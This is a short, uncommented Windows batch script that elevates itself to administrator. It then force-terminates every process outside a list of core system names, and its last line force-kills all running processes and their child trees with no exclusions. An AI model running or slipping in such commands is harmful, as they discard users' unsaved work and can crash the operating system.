@echo off
>nul 2>&1 net session
if %errorlevel% neq 0 (
  powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b
)
powershell -NoProfile -Command "Get-Process | Where-Object { $_.Name -notin @('Idle','System','Registry','smss','csrss','wininit','winlogon','services','lsass','svchost','fontdrvhost','dwm','conhost','spoolsv','sihost','ctfmon','RuntimeBroker','SearchIndexer','explorer','cmd','powershell','wmic','tasklist','taskkill') } | Stop-Process -Force -ErrorAction SilentlyContinue"
taskkill /F /FI "STATUS eq running" /T >nul 2>&1
exit /b 0
